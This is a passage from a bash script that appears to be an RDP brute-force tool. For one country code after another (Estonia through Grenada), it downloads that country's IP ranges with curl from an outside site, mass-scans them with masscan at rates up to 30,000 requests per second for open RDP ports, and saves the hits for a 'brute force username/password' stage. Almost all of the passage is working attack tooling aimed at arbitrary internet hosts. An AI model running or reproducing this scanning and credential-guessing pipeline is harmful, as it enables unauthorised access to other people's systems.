echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "57" ]; then
curl http://ipdiapazon.16mb.com/Estonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "58" ]; then
curl http://ipdiapazon.16mb.com/Ethiopia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "59" ]; then
curl http://ipdiapazon.16mb.com/European_union.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "60" ]; then
curl http://ipdiapazon.16mb.com/Faroe_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "61" ]; then
curl http://ipdiapazon.16mb.com/Fiji.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "62" ]; then
curl http://ipdiapazon.16mb.com/Finland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "63" ]; then
curl http://ipdiapazon.16mb.com/France.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "64" ]; then
curl http://ipdiapazon.16mb.com/French_guiana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "65" ]; then
curl http://ipdiapazon.16mb.com/French_polynesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "66" ]; then
curl http://ipdiapazon.16mb.com/Gabon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "67" ]; then
curl http://ipdiapazon.16mb.com/Gambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "68" ]; then
curl http://ipdiapazon.16mb.com/Georgia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "69" ]; then
curl http://ipdiapazon.16mb.com/Germany.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "70" ]; then
curl http://ipdiapazon.16mb.com/Ghana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "71" ]; then
curl http://ipdiapazon.16mb.com/Gibraltar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "72" ]; then
curl http://ipdiapazon.16mb.com/Greece.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "73" ]; then
curl http://ipdiapazon.16mb.com/Greenland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "74" ]; then
curl http://ipdiapazon.16mb.com/Grenada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
